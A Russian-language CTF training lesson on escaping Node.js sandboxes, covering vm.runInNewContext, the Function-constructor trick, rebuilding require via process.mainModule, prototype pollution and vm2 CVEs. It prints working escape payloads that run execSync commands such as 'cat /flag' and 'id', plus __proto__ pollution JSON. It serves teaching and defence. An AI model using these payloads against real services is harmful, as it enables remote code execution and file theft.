---
id: misc-nodejs-sandbox
title: "Node.js sandbox escape: vm, require и конструктор"
category: misc
parent: misc-sandbox-langs
difficulty: hard
order: 1
tags: [nodejs, javascript, sandbox, vm, require, escape, ctf]
prerequisites: [misc-sandbox]
useful_for:
  - "CTF Misc/web: побег из JS-песочниц"
  - "Пентест: анализ изоляции исполнения кода"
  - "Bug bounty: RCE через небезопасный eval/vm"
estimated_minutes: 45
summary: "Как выходить из Node.js-песочниц на базе vm, урезанного require и eval: побег через конструктор функции, prototype pollution, process.binding и восстановление require."
---

## Вопрос, с которого всё начинается

В прошлом уроке мы выходили из Python-песочницы. Теперь та же идея, но на JavaScript: сервис принимает код и запускает его через `vm.runInNewContext`, чтобы «безопасно» исполнить. Как из этого контекста добраться до системы?

## Наш пример: сервис на vm

Условие даёт код сервиса:

```javascript
const vm = require('vm');
const code = process.argv[2];
console.log(vm.runInNewContext(code));
```

`vm.runInNewContext` создаёт отдельный контекст и исполняет в нём наш код. Отправляем простой тест:

```
$ node server.js '1+1'
2
```

Контекст работает. Кажется, изоляция есть: у нас нет `require`, нет `process`. Но JavaScript устроен так, что это не так.

## Шаг 1: ментальная модель — всё есть объект

В JS **всё есть объект**, и у каждого объекта есть свойство `constructor`, указывающее на функцию, которая его создала. У функции `constructor` — это `Function`, а `Function` умеет создавать новую функцию из строки:

```javascript
const f = () => {};
console.log(f.constructor === Function);   // true
```

`vm` изолирует **переменные** (у нас нет `require` в области видимости), но не убирает `constructor` у объектов. Значит, из любого объекта мы можем добраться до `Function` и исполнить произвольный код.

## Шаг 2: побег через конструктор

Строим функцию, которая возвращает `process`:

```javascript
[].constructor.constructor("return process")()
```

- `[]` — пустой массив, объект;
- `.constructor` — функция `Array`;
- `.constructor` — снова `Function`;
- `("return process")` — создаёт новую функцию с этим телом;
- `()` — вызывает её, возвращая `process`.

Теперь у нас есть `process`. Отправляем на сервер:

```
$ node server.js '[].constructor.constructor("return process")().mainModule.require("child_process").execSync("cat /flag").toString()'
FLAG{vm_is_not_a_sandbox}
```

Флаг получен. `process.mainModule.require` — это тот самый `require`, который «должен был» быть недоступен.

## Шаг 3: восстановление require

Если сервис даёт урезанный `require` (whitelist модулей), его восстанавливают через `process`:

```javascript
const proc = (function(){}).constructor("return process")();
const req = proc.mainModule.require.bind(proc.mainModule);
req("child_process").execSync("id");
```

Альтернативы, если `mainModule` недоступен: `global.process`, `this.process` (в нестрогом режиме), `import()` для динамического импорта модулей. Всё сводится к одному: найти объект, из которого видно `process`.

## Шаг 4: prototype pollution

Если песочница **мержит** объекты из пользовательского JSON (`Object.assign`, рекурсивный merge), можно «отравить» прототип:

```javascript
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
Object.assign({}, {}, payload);
```

После этого все объекты получают свойство `polluted`. Само по себе это безвредно, но если библиотека затем читает свойство из прототипа — например, передаёт его в `child_process` как опцию или в шаблонизатор — это ведёт к RCE. Известные цепочки: pollution → `child_process.execSync` (через опции), pollution → `ejs`/`pug` (RCE в шаблонизаторе), pollution → подмена пути модуля в `require`.

## Шаг 5: vm2 и его CVE

`vm2` позиционируется как защищённая песочница, но регулярно ломается: CVE-2023-29017, CVE-2023-37466, CVE-2023-32314, CVE-2023-37903. Типовой вектор — заставить `vm2` разыменовать host-объект (ошибку, промис, прокси), из которого затем достаётся `constructor` → `Function` → `process`.

| CVE | Идея обхода |
|-----|-------------|
| CVE-2023-29017 | асинхронная ошибка в `handleException` |
| CVE-2023-32314 | обход через `Promise`/`async` |
| CVE-2023-37466 | `Proxy`-ловушка при определении свойств |
| CVE-2023-37903 | `Error.prepareStackTrace` |

Практика: определите точную версию (`npm ls vm2` или `package.json`) и возьмите публичный PoC под неё.

## Шаг 6: сравнение JS-песочниц

| Песочница | Изоляция | Типичный побег |
|-----------|----------|----------------|
| `vm.runInNewContext` | контекст, общий heap | `constructor` → `Function` |
| `vm.runInThisContext` | нет | всё доступно сразу |
| `vm2` | прокси-обёртки | CVE по версии |
| урезанный `require` | whitelist модулей | `process.mainModule.require` |
| `isolated-vm` | V8-изолят | сложнее, но известны обходы |

Вывод простой: видите `vm` или `eval` — начинайте с побега через конструктор; видите `vm2` — смотрите версию и CVE.

## Шаг 7: если не сработало

- **Верите, что `vm` изолирует.** Он изолирует переменные, но не конструкторы.
- **Сдались после блокировки `require`.** Восстановите его через `process.mainModule`.
- **Забыли про prototype pollution.** Часто ведёт к RCE через библиотеки.
- **Не проверили версию `vm2`.** Публичные CVE дают готовый PoC.
- **Игнорируете асинхронность.** Побег бывает через `Promise`/`async`-ловушки.

## Практический пример: prototype pollution → RCE

Разберём цепочку подробнее. Сервер мержит пользовательский JSON в объект настроек:

```javascript
const settings = Object.assign({}, defaults, userInput);
```

Отправляем payload, отравляющий прототип:

```javascript
const userInput = JSON.parse('{"__proto__":{"shell":"/bin/sh","env":{"EVIL":"1"}}}');
Object.assign({}, {}, userInput);
```

Теперь `Object.prototype` содержит свойства `shell` и `env`. Само по себе это безвредно, но если какая-нибудь библиотека читает эти свойства из прототипа — например, передаёт их в `child_process` как опции или подставляет путь в шаблонизатор — выполняется код. Известные цепочки: pollution → `child_process.execSync` (через опции), pollution → `ejs`/`pug` (RCE в шаблонизаторе), pollution → подмена пути модуля в `require`.

Ищите каждое место, где пользовательский JSON попадает в рекурсивный merge без фильтрации `__proto__`, `constructor` и `prototype`. Это частая уязвимость и в песочницах, и в обычных Node.js-приложениях.

## Что мы теперь знаем

По-простому:

1. `vm` изолирует переменные, но не убирает `constructor` у объектов.
2. `[].constructor.constructor("return process")()` возвращает `process`.
3. Через `process.mainModule.require` восстанавливается доступ к любому модулю.
4. Prototype pollution отравляет `Object.prototype` и всплывает в gadget-цепочках.
5. Для `vm2` побег зависит от версии — ищите CVE.

## На что смотреть дальше

- **Не верьте в «безопасный» `vm`.** Проверяйте доступ к `Function`.
- **Блокировка `require` не конец.** Есть `process.mainModule` и `import()`.
- **Проверяйте места merge JSON.** Там прячется prototype pollution.
- **Уточняйте версию `vm2`.** Обходы различаются от версии к версии.
- **Учитывайте асинхронность.** Ловушки бывают в промисах и ошибках.

## Квиз

Проверь себя.

```quiz
- question: "Почему vm в Node.js не считается песочницей безопасности?"
  options:
    - "из контекста легко добраться до process/require через конструкторы"
    - "он всегда шифрует код"
    - "он удаляет функции"
    - "он безвреден"
  answer: 0
  explanation: "vm не изолирует от глобальных конструкторов."
- question: "Что даёт `f.constructor`?"
  options:
    - "ничего"
    - "только имя функции"
    - "ссылку на Function, позволяющую исполнять код"
    - "размер функции"
  answer: 2
  explanation: "constructor функции — Function."
- question: "Как восстановить require при побеге?"
  options:
    - "process.mainModule.require"
    - "через JSON.parse"
    - "через Math.random"
    - "через Date"
  answer: 0
  explanation: "mainModule даёт доступ к require."
- question: "Чем опасен prototype pollution?"
  options:
    - "ускоряет код"
    - "шифрует строки"
    - "удаляет массивы"
    - "отравляет Object.prototype и влияет на всё приложение"
  answer: 3
  explanation: "Pollution всплывает в merge- и gadget-цепочках."
- question: "Что нужно проверить у vm2?"
  options:
    - "цвет консоли"
    - "версию и известные CVE"
    - "часовой пояс"
    - "размер файла"
  answer: 1
  explanation: "Обходы vm2 зависят от версии."
```

## Куда дальше

Мы выбрались из JS-песочницы через конструктор. Дальше — **Lua**: песочницы, которые вырезают `os`/`io`, но забывают про `debug` и `getfenv`. А пока главное запомни: в динамическом языке из любого объекта видно `constructor`, а из него — весь нативный слой.

## Где пригодится

- **CTF Misc/web:** побег из JS-песочниц.
- **Пентест:** анализ изоляции исполнения кода.
- **Bug bounty:** RCE через небезопасный eval/vm.
- **Работа:** не использовать vm для безопасности, изолировать процессы.
